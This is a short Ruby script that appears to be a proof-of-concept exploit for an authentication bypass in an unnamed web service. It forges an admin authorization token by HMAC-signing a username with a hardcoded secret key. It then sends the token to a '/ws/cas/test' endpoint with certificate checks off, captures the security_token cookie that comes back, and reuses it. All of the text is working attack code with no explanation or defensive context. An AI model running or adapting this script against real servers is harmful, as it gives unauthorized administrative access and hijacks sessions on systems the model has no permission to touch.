require 'base64'
require 'hmac-sha1'
require 'httparty'

TARGET = ARGV[0] || '10.0.0.79'
USERNAME = ARGV[1] || 'admin'
SECRET_KEY = '?~!@#$%^^)('

c = HMAC::SHA1::new(SECRET_KEY)
c.update(USERNAME)
TOKEN = Base64::encode64(c.digest())
puts "Generated auth key: #{TOKEN}"

response = HTTParty.get(
  "https://#{TARGET}/ws/cas/test",
  verify: false,
  headers: {
    'Authorization' => "#{USERNAME} #{TOKEN}",
  }
)

if response.headers['set-cookie']
  if response.headers['set-cookie'] =~ /(security_token=[a-f0-9]*)/
    puts "Found token:"
    token = $1
    puts token
  else
    puts "No `security_token` set, server might not be vulnerable"
    exit 1
  end
else
  puts "No cookies in response!"
  exit 1
end

pp HTTParty.get(
  "https://#{TARGET}/ws/cas/test",
  verify: false,
  headers: {
    'Cookie' => token,
  }
).headers
